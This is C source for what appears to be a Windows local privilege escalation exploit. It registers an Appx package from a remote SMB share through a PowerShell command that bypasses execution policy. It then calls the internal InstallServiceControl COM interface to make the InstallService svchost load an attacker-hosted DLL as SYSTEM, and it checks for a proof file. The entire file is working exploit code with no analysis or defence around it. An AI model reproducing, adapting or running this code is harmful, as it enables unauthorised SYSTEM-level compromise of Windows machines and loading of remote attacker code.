#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <wchar.h>
#include <process.h>
#include <errno.h>

typedef HRESULT (WINAPI *RoInitializeFn)(int);
typedef void (WINAPI *RoUninitializeFn)(void);
typedef HRESULT (WINAPI *WindowsCreateStringFn)(const WCHAR *, UINT32, void **);
typedef HRESULT (WINAPI *WindowsDeleteStringFn)(void *);
typedef HRESULT (WINAPI *RoActivateInstanceFn)(void *, void **);
typedef HRESULT (STDMETHODCALLTYPE *QueryInterfaceFn)(void *, REFIID, void **);
typedef ULONG (STDMETHODCALLTYPE *ReleaseFn)(void *);
typedef HRESULT (STDMETHODCALLTYPE *CreateWorkFn)(void *, void *, void *, void *, void *, void *, void *, void **);

static char package_name[128] = "DiscCoerceProbe";

#define VTABLE(obj, slot) (((void **)(*(void ***)obj))[slot])

static int register_package(const char *host, const char *share, WCHAR *pfn, int pfn_len, char *location, int location_len)
{
	char cmd[1024];
	char line[1024];
	char *sep;
	int st;

	printf("[*] appx -> _popen -> powershell Add-AppxPackage -Register \\\\%s\\%s\\AppxManifest.xml\n", host, share);
	printf("\t[~] Get-AppxPackage -Name %s | Remove-AppxPackage\n", package_name);

	snprintf(cmd, sizeof(cmd),
		"powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \""
		"$ErrorActionPreference='Stop'; "
		"Get-AppxPackage -Name %s | Remove-AppxPackage -ErrorAction SilentlyContinue; "
		"Add-AppxPackage -Register '\\\\%s\\%s\\AppxManifest.xml'; "
		"$p=Get-AppxPackage -Name %s; if (-not $p) { exit 2 }; "
		"Write-Output ($p.PackageFamilyName + '|' + $p.InstallLocation)\"",
		package_name, host, share, package_name);

	FILE *pipe = _popen(cmd, "r");
	if (!pipe) {
		printf("\t[~] _popen -> failed (errno=%d)\n", errno);
		return -1;
	}

	if (!fgets(line, (int)sizeof(line), pipe)) {
		_pclose(pipe);
		printf("\t[~] read -> no output from registration script\n");
		return -1;
	}

	st = _pclose(pipe);
	if (st != 0) {
		printf("\t[~] exit code -> %d\n", st);
		printf("\t[~] output -> %s", line);
		return st;
	}

	sep = strchr(line, '|');
	if (!sep) {
		printf("\t[~] parse -> expected PFN|InstalledLocation, got:\n%s", line);
		return -1;
	}

	*sep = 0;
	MultiByteToWideChar(CP_ACP, 0, line, -1, pfn, pfn_len);
	snprintf(location, location_len, "%s", sep + 1);

	printf("\t[~] PackageFamilyName -> %s\n", line);
	printf("\t[~] InstalledLocation -> %s\n", location);
	return 0;
}

static HRESULT trigger_install_work(
	RoInitializeFn ro_initialize,
	RoUninitializeFn ro_uninitialize,
	WindowsCreateStringFn windows_create_string,
	WindowsDeleteStringFn windows_delete_string,
	RoActivateInstanceFn ro_activate_instance,
	const WCHAR *pfn,
	const char *host,
	const char *share)
{
	WCHAR unc[256];
	WCHAR host_w[128];
	WCHAR share_w[128];
	WCHAR json_unc[512];
	WCHAR json_pfn[256];
	WCHAR fulfillment[1024];
	WCHAR json_fulfillment[1536];
	WCHAR properties[2048];
	const WCHAR *src;
	int i;
	void *class_name = NULL;
	void *correlation = NULL;
	void *caller = NULL;
	void *arg3 = NULL;
	void *arg4 = NULL;
	void *props = NULL;
	void *options = NULL;
	void *instance = NULL;
	void *control = NULL;
	void *view = NULL;
	HRESULT result;
	static const GUID install_service_iid = { 0xe4893a99, 0x9270, 0x42b9, { 0x9a, 0x62, 0x68, 0x3d, 0x6c, 0xee, 0xd2, 0x50 } };

	MultiByteToWideChar(CP_ACP, 0, host, -1, host_w, 128);
	MultiByteToWideChar(CP_ACP, 0, share, -1, share_w, 128);
	swprintf(unc, 256, L"\\\\%ls\\%ls\\InstallServicePlugin.dll", host_w, share_w);

	i = 0;
	json_unc[i++] = L'"';
	for (src = unc; *src && i + 4 < (int)(sizeof(json_unc) / sizeof(json_unc[0])); src++) {
		if (*src == L'\\' || *src == L'"')
			json_unc[i++] = L'\\';
		json_unc[i++] = *src;
	}
	json_unc[i++] = L'"';
	json_unc[i] = 0;

	i = 0;
	json_pfn[i++] = L'"';
	for (src = pfn; *src && i + 4 < (int)(sizeof(json_pfn) / sizeof(json_pfn[0])); src++) {
		if (*src == L'\\' || *src == L'"')
			json_pfn[i++] = L'\\';
		json_pfn[i++] = *src;
	}
	json_pfn[i++] = L'"';
	json_pfn[i] = 0;

	swprintf(fulfillment, 1024,
		L"{\"ProductId\":\"coerce\",\"SkuId\":\"0001\",\"ProductTitle\":\"coerce\",\"PackageFamilyName\":%ls,\"FulfillmentPluginId\":%ls,\"Market\":\"US\",\"SourceUri\":%ls}",
		json_pfn, json_pfn, json_unc);

	i = 0;
	json_fulfillment[i++] = L'"';
	for (src = fulfillment; *src && i + 4 < (int)(sizeof(json_fulfillment) / sizeof(json_fulfillment[0])); src++) {
		if (*src == L'\\' || *src == L'"')
			json_fulfillment[i++] = L'\\';
		json_fulfillment[i++] = *src;
	}
	json_fulfillment[i++] = L'"';
	json_fulfillment[i] = 0;

	swprintf(properties, 2048,
		L"{\"SkipCatalogLookup\":true,\"SourceUri\":%ls,\"ProductId\":\"coerce\",\"SkuId\":\"0001\",\"ProductTitle\":\"coerce\",\"PackageFamilyName\":%ls,\"FulfillmentPluginId\":%ls,\"Market\":\"US\",\"SerializedFulfillmentData\":%ls}",
		json_unc, json_pfn, json_pfn, json_fulfillment);

	printf("[*] combase -> RoInitialize(RO_INIT_SINGLETHREADED)\n");
	result = ro_initialize(1);
	printf("\t[~] hr -> 0x%08X\n", (unsigned int)result);

	printf("[*] combase -> WindowsCreateString(InstallServiceControl)\n");
	windows_create_string(L"Windows.Internal.InstallService.Control.InstallServiceControl",
		(UINT32)wcslen(L"Windows.Internal.InstallService.Control.InstallServiceControl"), &class_name);

	printf("[*] combase -> RoActivateInstance(InstallServiceControl)\n");
	result = ro_activate_instance(class_name, &instance);
	printf("\t[~] hr -> 0x%08X\n", (unsigned int)result);
	if (FAILED(result))
		goto done;

	printf("[*] vtable[0] -> QueryInterface(IInstallServiceControl e4893a99-9270-42b9-9a62-683d6ceed250)\n");
	result = ((QueryInterfaceFn)VTABLE(instance, 0))(instance, &install_service_iid, &control);
	printf("\t[~] hr -> 0x%08X\n", (unsigned int)result);
	if (FAILED(result))
		goto done;

	windows_create_string(L"uncanny", 7, &correlation);
	windows_create_string(L"", 0, &caller);
	windows_create_string(L"", 0, &arg3);
	windows_create_string(L"", 0, &arg4);
	windows_create_string(properties, (UINT32)wcslen(properties), &props);
	windows_create_string(L"{}", 2, &options);

	printf("[*] vtable[8] -> CreateInstallServiceWork\n");
	printf("\t[~] FulfillmentPluginId -> %ls\n", pfn);
	printf("\t[~] SkipCatalogLookup -> true\n");
	printf("\t[~] SourceUri -> %ls\n", unc);
	printf("\t[~] expected SYSTEM path -> PluginHelpers::ActivatePlugin -> LoadLibraryW(%ls)\n", unc);

	result = ((CreateWorkFn)VTABLE(control, 8))(control, correlation, caller, arg3, arg4, props, options, &view);
	printf("\t[~] hr -> 0x%08X (async work queued; loader runs inside InstallService svchost)\n", (unsigned int)result);

done:
	if (correlation)
		windows_delete_string(correlation);
	if (caller)
		windows_delete_string(caller);
	if (arg3)
		windows_delete_string(arg3);
	if (arg4)
		windows_delete_string(arg4);
	if (props)
		windows_delete_string(props);
	if (options)
		windows_delete_string(options);
	if (view)
		((ReleaseFn)VTABLE(view, 2))(view);
	if (control)
		((ReleaseFn)VTABLE(control, 2))(control);
	if (instance)
		((ReleaseFn)VTABLE(instance, 2))(instance);
	if (class_name)
		windows_delete_string(class_name);

	printf("[*] combase -> RoUninitialize\n");
	ro_uninitialize();
	return result;
}

int main(int argc, char **argv)
{
	HMODULE combase;
	RoInitializeFn ro_initialize;
	RoUninitializeFn ro_uninitialize;
	WindowsCreateStringFn windows_create_string;
	WindowsDeleteStringFn windows_delete_string;
	RoActivateInstanceFn ro_activate_instance;
	const char *host;
	const char *share;
	const char *package_arg;
	const char *pfn_arg;
	char user[128];
	DWORD user_len;
	HANDLE token;
	TOKEN_ELEVATION elevation;
	DWORD elevation_len;
	BOOL elevated;
	WCHAR pfn[256];
	char location[512];
	HRESULT trigger_result;
	DWORD proof_attr;
	BOOL proof_exists;
	int register_result;

	if (argc < 2) {
		printf("usage: lpe.exe <host> [share] [package] [pfn]\n");
		return 1;
	}

	host = argv[1];
	share = argc >= 3 ? argv[2] : "coerce";
	package_arg = argc >= 4 ? argv[3] : "DiscCoerceProbe";
	pfn_arg = argc >= 5 ? argv[4] : NULL;
	snprintf(package_name, sizeof(package_name), "%s", package_arg);

	printf("[*] caller -> GetUserNameA\n");
	user_len = (DWORD)sizeof(user);
	GetUserNameA(user, &user_len);
	printf("\t[~] user -> %s\n", user);

	elevated = FALSE;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
		elevation_len = sizeof(elevation);
		if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &elevation_len))
			elevated = elevation.TokenIsElevated ? TRUE : FALSE;
		CloseHandle(token);
	}
	printf("[*] caller -> OpenProcessToken(TokenElevation) -> %s\n", elevated ? "elevated" : "medium");

	combase = LoadLibraryW(L"combase.dll");
	if (!combase) {
		printf("[*] kernel32 -> LoadLibraryW(combase.dll) -> failed gle=%lu\n", GetLastError());
		return 1;
	}
	printf("[*] kernel32 -> LoadLibraryW(combase.dll) -> %p\n", combase);

	ro_initialize = (RoInitializeFn)GetProcAddress(combase, "RoInitialize");
	ro_uninitialize = (RoUninitializeFn)GetProcAddress(combase, "RoUninitialize");
	windows_create_string = (WindowsCreateStringFn)GetProcAddress(combase, "WindowsCreateString");
	windows_delete_string = (WindowsDeleteStringFn)GetProcAddress(combase, "WindowsDeleteString");
	ro_activate_instance = (RoActivateInstanceFn)GetProcAddress(combase, "RoActivateInstance");

	if (!ro_initialize || !ro_uninitialize || !windows_create_string || !windows_delete_string || !ro_activate_instance) {
		printf("[*] kernel32 -> GetProcAddress(combase exports) -> incomplete\n");
		return 1;
	}

	printf("[*] package -> %s\n", package_name);
	printf("[*] manifest -> \\\\%s\\%s\\AppxManifest.xml\n", host, share);
	printf("[*] dll share -> \\\\%s\\%s\\InstallServicePlugin.dll\n", host, share);

	memset(pfn, 0, sizeof(pfn));
	memset(location, 0, sizeof(location));

	if (pfn_arg) {
		MultiByteToWideChar(CP_ACP, 0, pfn_arg, -1, pfn, 256);
		snprintf(location, sizeof(location), "\\\\%s\\%s", host, share);
		printf("[*] appx -> using caller-supplied PackageFamilyName\n");
		printf("\t[~] PackageFamilyName -> %s\n", pfn_arg);
		printf("\t[~] InstalledLocation -> %s\n", location);
	} else {
		register_result = register_package(host, share, pfn, 256, location, (int)sizeof(location));
		if (register_result != 0 || !pfn[0]) {
			printf("[*] appx -> registration failed (Developer Mode / interactive session / NTFS SMB?)\n");
			return 1;
		}
	}

	if (strncmp(location, "\\\\", 2) != 0) {
		printf("[*] appx -> InstalledLocation is local, not UNC -> abort before trigger\n");
		return 1;
	}

	trigger_result = trigger_install_work(ro_initialize, ro_uninitialize, windows_create_string,
		windows_delete_string, ro_activate_instance, pfn, host, share);

	Sleep(1500);

	proof_attr = GetFileAttributesW(L"C:\\Users\\Public\\uncanny_lpe.txt");
	proof_exists = proof_attr != INVALID_FILE_ATTRIBUTES && !(proof_attr & FILE_ATTRIBUTE_DIRECTORY);

	if (proof_exists)
		printf("[+] uncanny_lpe.txt -> present (DllMain in svchost as SYSTEM)\n");
	else if (SUCCEEDED(trigger_result))
		printf("[*] uncanny_lpe.txt -> missing (coercion may still have fired; need Samba-hosted loadable dll)\n");
	else
		printf("[*] uncanny_lpe.txt -> missing (CreateInstallServiceWork failed before loader)\n");

	return proof_exists || SUCCEEDED(trigger_result) ? 0 : 1;
}
